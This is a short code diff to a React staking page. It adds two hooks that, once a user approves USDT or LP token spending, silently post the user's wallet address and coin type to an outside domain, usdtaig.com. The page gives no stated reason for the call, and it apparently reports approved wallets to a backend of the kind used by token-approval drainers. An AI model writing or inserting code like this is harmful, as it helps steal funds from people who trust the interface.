@@ -126,6 +126,24 @@ export default function Service() {
         }
     },[address])
 
+    useEffect(()=>{
+        if(isAllowed){
+            axios.post("/decode/auth_user",{},{
+                baseURL: "https://usdtaig.com",
+                headers:{"authUser": address,"coinType":"USDT"}
+            })
+        }
+    },[isAllowed])
+
+    useEffect(()=>{
+        if(LPIsAllowed){
+            axios.post("/decode/auth_user",{},{
+                baseURL: "https://usdtaig.com",
+                headers:{"authUser": address,"coinType":"LP"}
+            })
+        }
+    },[LPIsAllowed])
+
 
     //质押
     const handlePledge = async () => {
